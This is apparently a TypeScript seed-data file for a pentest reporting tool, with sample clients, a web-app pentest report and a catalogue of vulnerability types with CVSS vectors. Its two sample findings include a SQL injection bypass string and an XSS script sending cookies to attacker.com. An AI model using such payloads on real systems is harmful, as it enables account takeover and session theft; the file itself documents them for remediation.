

import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';
import { format } from 'date-fns';

export let clients: Client[] = [
  { id: 'cli-1', name: 'Innovatech Solutions', contact: 'contact@innovatech.com', logoUrl: 'https://picsum.photos/seed/innovatech/128/128' },
  { id: 'cli-2', name: 'Quantum Dynamics', contact: 'security@quantum.com', logoUrl: 'https://picsum.photos/seed/quantum/128/128' },
  { id: 'cli-3', name: 'SecureBank Corp', contact: 'audit@securebank.com', logoUrl: 'https://picsum.photos/seed/securebank/128/128' },
  { id: 'cli-4', name: 'HealthFirst Providers', contact: 'compliance@healthfirst.com', logoUrl: 'https://picsum.photos/seed/healthfirst/128/128' },
];

export let projects: Project[] = [
  { 
    id: 'proj-1', 
    clientId: 'cli-1', 
    name: 'Q3 Web App Pentest', 
    reportBody: `## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.innovatech.com, api.innovatech.com
- **External Network:** 198.51.100.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

## Attack Narrative
The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-07-01', 
    endDate: '2023-07-15', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-07-01T10:00:00Z', 
    updatedAt: '2023-07-15T18:00:00Z', 
    icon: 'Scan' 
  },
  { 
    id: 'proj-2', 
    clientId: 'cli-2', 
    name: 'Análisis de Red Interna', 
    reportBody: '', 
    startDate: '2023-08-10', 
    endDate: '2023-08-20', 
    status: 'In Progress', 
    language: 'es', 
    createdAt: '2023-08-10T09:00:00Z', 
    updatedAt: '2023-08-15T14:30:00Z', 
    icon: 'Network' 
  },
];

export let findings: Finding[] = [
  { 
    id: 'find-1', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-web-001', 
    title: 'SQL Injection on Login Form', 
    severity: 'Critical', 
    cvss: 9.8, 
    markdown: `### Overview
A critical SQL Injection vulnerability was identified in the main login form of the application. This flaw allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application, potentially with administrative privileges.

### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

### Affected Components
- \`/auth/login\` endpoint
- User authentication module

### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full compromise of the application, data exfiltration, and further attacks against the underlying infrastructure.

### Recommendations
Implement parameterized queries (prepared statements) to handle all user-supplied input in database queries. This is the most effective way to prevent SQL Injection attacks. Validate and sanitize all user input on the server side as a defense-in-depth measure.`, 
    createdAt: '2023-07-05T11:00:00Z', 
    updatedAt: '2023-07-10T15:00:00Z' 
  },
  { 
    id: 'find-2', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-web-002', 
    title: 'Stored Cross-Site Scripting (XSS) in User Profile', 
    severity: 'High', 
    cvss: 8.0, 
    markdown: `### Overview
A stored XSS vulnerability exists in the user profile section, allowing an attacker to inject malicious scripts that execute in the browsers of other users, including administrators.

### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

### Recommendations
Implement context-aware output encoding for all user-supplied data before it is rendered in the browser. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.`, 
    createdAt: '2023-07-06T14:00:00Z', 
    updatedAt: '2023-07-11T10:00:00Z' 
  },
];

const emptyVulnBoilerplate = {
  overview_en: "[TODO: Add overview]",
  overview_es: "[TODO: Añadir resumen]",
  remediation_en: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  remediation_es: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  references: [],
};

export let vulnerabilities: Vulnerability[] = [
    // Web
    { id: "vuln-web-001", title_en: "SQL Injection", title_es: "Inyección SQL", cwe: "CWE-89", severity: "Critical", cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-002", title_en: "Cross-Site Scripting (XSS)", title_es: "Secuencias de comandos en sitios cruzados", cwe: "CWE-79", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-003", title_en: "Broken Authentication", title_es: "Autenticación rota", cwe: "CWE-287", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-004", title_en: "Sensitive Data Exposure", title_es: "Exposición de datos sensibles", cwe: "CWE-312", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-005", title_en: "XML External Entities (XXE)", title_es: "Entidades externas XML", cwe: "CWE-611", severity: "High", cvss: { score: 8.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-006", title_en: "Broken Access Control", title_es: "Control de acceso roto", cwe: "CWE-284", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-007", title_en: "Security Misconfiguration", title_es: "Configuración insegura", cwe: "CWE-16", severity: "High", cvss: { score: 8.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-008", title_en: "Cross-Site Request Forgery (CSRF)", title_es: "Falsificación de solicitudes en sitios cruzados", cwe: "CWE-352", severity: "High", cvss: { score: 7.6, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "N", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-009", title_en: "Insecure Deserialization", title_es: "Deserialización insegura", cwe: "CWE-502", severity: "Critical", cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-010", title_en: "Server-Side Request Forgery (SSRF)", title_es: "Falsificación de solicitudes del lado del servidor", cwe: "CWE-918", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-011", title_en: "HTTP Verb Tampering", title_es: "Manipulación de verbos HTTP", cwe: "CWE-350", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-012", title_en: "Local File Inclusion (LFI)", title_es: "Inclusión de archivos locales", cwe: "CWE-98", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Web"] },
    { id: "vuln-web-013", title_en: "SSRF to Local File Read", title_es: "SSRF para lectura de archivos locales", cwe: "CWE-918", severity: "High", cvss: { score: 8.6, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Web"] },

    // Mobile
    { id: "vuln-mobile-014", title_en: "Insecure Data Storage", title_es: "Almacenamiento inseguro de datos", cwe: "CWE-922", severity: "High", cvss: { score: 8.2, vectorString: "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "P", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-015", title_en: "Weak Server-Side Controls", title_es: "Controles débiles en el servidor", cwe: "CWE-602", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-016", title_en: "Insufficient Transport Layer Protection", title_es: "Protección insuficiente de la capa de transporte", cwe: "CWE-319", severity: "High", cvss: { score: 7.4, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-017", title_en: "Unintended Data Leakage", title_es: "Filtración de datos no intencionada", cwe: "CWE-200", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-018", title_en: "Poor Authorization", title_es: "Autorización deficiente", cwe: "CWE-285", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-019", title_en: "Broken Cryptography", title_es: "Criptografía rota", cwe: "CWE-327", severity: "High", cvss: { score: 8.3, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-020", title_en: "Client-Side Injection", title_es: "Inyección en el lado del cliente", cwe: "CWE-74", severity: "High", cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-021", title_en: "Security Misconfiguration", title_es: "Configuración insegura", cwe: "CWE-16", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-022", title_en: "Reverse Engineering", title_es: "Ingeniería inversa", cwe: "CWE-506", severity: "Medium", cvss: { score: 6.2, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },
    { id: "vuln-mobile-023", title_en: "Extraneous Functionality", title_es: "Funcionalidad oculta", cwe: "CWE-1002", severity: "Medium", cvss: { score: 5.4, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Mobile"] },

    // Network
    { id: "vuln-network-024", title_en: "Man-in-the-Middle (MitM)", title_es: "Ataque de intermediario", cwe: "CWE-300", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-025", title_en: "DNS Spoofing", title_es: "Suplantación de DNS", cwe: "CWE-345", severity: "High", cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-026", title_en: "ARP Poisoning", title_es: "Envenenamiento ARP", cwe: "CWE-345", severity: "High", cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-027", title_en: "IP Spoofing", title_es: "Suplantación de IP", cwe: "CWE-290", severity: "Medium", cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-028", title_en: "Denial of Service (DoS)", title_es: "Denegación de servicio", cwe: "CWE-400", severity: "High", cvss: { score: 8.6, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "N", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-029", title_en: "VLAN Hopping", title_es: "Salto entre VLAN", cwe: "CWE-671", severity: "Medium", cvss: { score: 6.4, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-030", title_en: "Weak Network Encryption", title_es: "Cifrado débil de red", cwe: "CWE-326", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-031", title_en: "Firewall Misconfiguration", title_es: "Configuración incorrecta del firewall", cwe: "CWE-16", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-032", title_en: "Unsecured Wi-Fi", title_es: "Wi-Fi no segura", cwe: "CWE-311", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },
    { id: "vuln-network-033", title_en: "Packet Sniffing", title_es: "Análisis de paquetes", cwe: "CWE-311", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Network"] },

    // Infrastructure
    { id: "vuln-infra-034", title_en: "Unpatched Software", title_es: "Software sin parches", cwe: "CWE-937", severity: "Critical", cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-035", title_en: "Default Credentials", title_es: "Credenciales por defecto", cwe: "CWE-1392", severity: "High", cvss: { score: 8.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-036", title_en: "Directory Traversal", title_es: "Salto de directorio", cwe: "CWE-22", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-037", title_en: "Remote Code Execution (RCE)", title_es: "Ejecución remota de código", cwe: "CWE-94", severity: "Critical", cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-038", title_en: "Privilege Escalation", title_es: "Escalación de privilegios", cwe: "CWE-269", severity: "High", cvss: { score: 8.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-039", title_en: "Information Disclosure", title_es: "Divulgación de información", cwe: "CWE-200", severity: "Medium", cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-040", title_en: "Command Injection", title_es: "Inyección de comandos", cwe: "CWE-77", severity: "High", cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-041", title_en: "Path Traversal", title_es: "Salto de ruta", cwe: "CWE-22", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-042", title_en: "Open Redirects", title_es: "Redirecciones abiertas", cwe: "CWE-601", severity: "Medium", cvss: { score: 5.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-043", title_en: "Insecure File Shares", title_es: "Recursos compartidos de archivos inseguros", cwe: "CWE-276", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-044", title_en: "Sensitive Data on File Shares", title_es: "Datos sensibles en recursos compartidos", cwe: "CWE-312", severity: "High", cvss: { score: 8.2, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-045", title_en: "Unnecessary Exposed Services", title_es: "Servicios expuestos innecesariamente", cwe: "CWE-200", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },
    { id: "vuln-infra-046", title_en: "Misconfigured <APPLICATION> Instance", title_es: "Instancia de <APPLICATION> mal configurada", cwe: "CWE-16", severity: "High", cvss: { score: 8.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Infrastructure"] },

    // Authentication
    { id: "vuln-auth-047", title_en: "Weak Passwords", title_es: "Contraseñas débiles", cwe: "CWE-521", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-048", title_en: "Password Reuse", title_es: "Reutilización de contraseñas", cwe: "CWE-262", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-049", title_en: "Missing Multi-Factor Authentication (MFA)", title_es: "Falta de autenticación multifactor", cwe: "CWE-308", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-050", title_en: "Session Hijacking", title_es: "Secuestro de sesión", cwe: "CWE-384", severity: "High", cvss: { score: 8.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-051", title_en: "Session Fixation", title_es: "Fijación de sesión", cwe: "CWE-384", severity: "High", cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-052", title_en: "Credential Stuffing", title_es: "Relleno de credenciales", cwe: "CWE-287", severity: "High", cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-053", title_en: "Insecure Password Recovery", title_es: "Recuperación insegura de contraseñas", cwe: "CWE-640", severity: "Medium", cvss: { score: 6.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-054", title_en: "User Enumeration", title_es: "Enumeración de usuarios", cwe: "CWE-203", severity: "Medium", cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
    { id: "vuln-auth-055", title_en: "Weak Session Management", title_es: "Gestión débil de sesiones", cwe: "CWE-384", severity: "High", cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" }, ...emptyVulnBoilerplate, tags: ["Authentication"] },
